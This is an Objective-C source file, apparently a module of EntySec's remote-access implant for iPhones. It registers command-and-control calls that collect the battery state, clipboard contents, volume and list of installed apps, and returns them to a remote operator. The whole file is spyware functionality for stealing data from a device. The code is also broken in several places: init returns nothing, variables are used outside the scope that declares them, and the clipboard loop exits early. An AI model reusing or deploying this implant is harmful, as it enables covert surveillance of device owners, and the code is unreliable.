/*
 * MIT License
 *
 * Copyright (c) 2020-2023 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include "c2.h"
#include "tlv.h"

#import <Foundation/Foundation.h>
#import <CoreLocation/CoreLocation.h>
#import <AVFoundation/AVFoundation.h>

@interface iPhone ()
{
}

@property(retain) UIDevice *thisUIDevice;

- (NSString *)iphoneBattery;
- (NSString *)iphonePasteboard;
- (NSString *)iphoneVolume;
- (NSString *)iphoneBundles;

@end

@implementation iPhone

- (id)init
{
    _thisUIDevice = [UIDevice currentDevice];
    [_thisUIDevice setBatteryMonitoringEnabled:YES];
}

- (NSString *)iphoneBattery
{
    int battery_level = ([_thisUIDevice batteryLevel] * 100);
    NSString *info = [NSString stringWithFormat:@"Battery level: %d (%@charging)",
                      battery_level, [_thisUIDevice batteryState] == UIDeviceBatteryStateCharging ? @"" : @"not "];
    return info;
}

- (NSString *)iphonePasteboard
{
    UIPasteboard* pb = [UIPasteboard generalPasteboard];

    if ([pb.strings count] > 1) {
        NSUInteger count = 0;
        for (NSString* pstring in pb.strings){
            return [NSString stringWithFormat:@"%lu: %@\n", count, pstring];
            count++;
        }
    } else if ([pb.strings count] == 1)
        return [NSString stringWithFormat:@"%@\n", [pb.strings firstObject]];
}

- (NSString *)iphoneVolume
{
    [[AVAudioSession sharedInstance] setActive:YES error:nil];
    [[AVAudioSession sharedInstance] addObserver:self forKeyPath:@"outputVolume" options:NSKeyValueObservingOptionNew context:nil];
    return [NSString stringWithFormat:@"Volume level: %.2f", [AVAudioSession sharedInstance].outputVolume];
}

- (NSString *)iphoneBundles
{
    char buffer[1024];

    NSString* result = @"";
    CFArrayRef array = SBSCopyApplicationDisplayIdentifiers(NO, NO);
    CFIndex pointer;

    for (pointer = 0; pointer < CFArrayGetCount(array); pointer++) {
        CFStringGetCString(CFArrayGetValueAtIndex(array, pointer), buffer, sizeof(buffer), kCFStringEncodingUTF8);
        result = [NSString stringWithFormat:@"%@%s\n", result, buffer];
    }

    return result;
}

@end

static c2_api_call_t *iphone_battery(tlv_transport_pkt_t tlv_transport_packet)
{
    @autoreleasepool
    {
        iPhone *iphone = [[iPhone alloc] init];
        char *battery_info = (char *)[[iphone iphoneBattery] UTF8String];
    }

    return craft_c2_api_call_pkt(tlv_transport_packet, API_CALL_SUCCESS, battery_info);
}

static c2_api_call_t *iphone_pasteboard(tlv_transport_pkt_t tlv_transport_packet)
{
    @autoreleasepool
    {
        iPhone *iphone = [[iPhone alloc] init];
        char *pasteboard_data = (char *)[[iphone iphonePasteboard] UTF8String];
    }

    return craft_c2_api_call_pkt(tlv_transport_packet, API_CALL_SUCCESS, pasteboard_data);
}

static c2_api_call_t *iphone_volume(tlv_transport_pkt_t tlv_transport_packet)
{
    @autoreleasepool
    {
        iPhone *iphone = [[iPhone alloc] init];
        char *volume_level = (char *)[[iphone iphoneVolume] UTF8String];
    }

    return craft_c2_api_call_pkt(tlv_transport_packet, API_CALL_SUCCESS, volume_level);
}

static c2_api_call_t *iphone_bundles(tlv_transport_pkt_t tlv_transport_packet)
{
    @autoreleasepool
    {
        iPhone *iphone = [[iPhone alloc] init];
        char *bundle_ids = (char *)[[iphone iphoneBundles] UTF8String];
    }

    return craft_c2_api_call_pkt(tlv_transport_packet, API_CALL_SUCCESS, bundle_ids);
}

void register_iphone_api_calls(c2_api_calls_t **c2_api_calls_table)
{
    c2_register_api_call(c2_api_calls_table, API_CALL + 3, iphone_battery, API_SCOPE_STDAPI);
    c2_register_api_call(c2_api_calls_table, API_CALL + 4, iphone_pasteboard, API_SCOPE_STDAPI);
    c2_register_api_call(c2_api_calls_table, API_CALL + 5, iphone_volume, API_SCOPE_STDAPI);
    c2_register_api_call(c2_api_calls_table, API_CALL + 6, iphone_bundles, API_SCOPE_STDAPI);
}
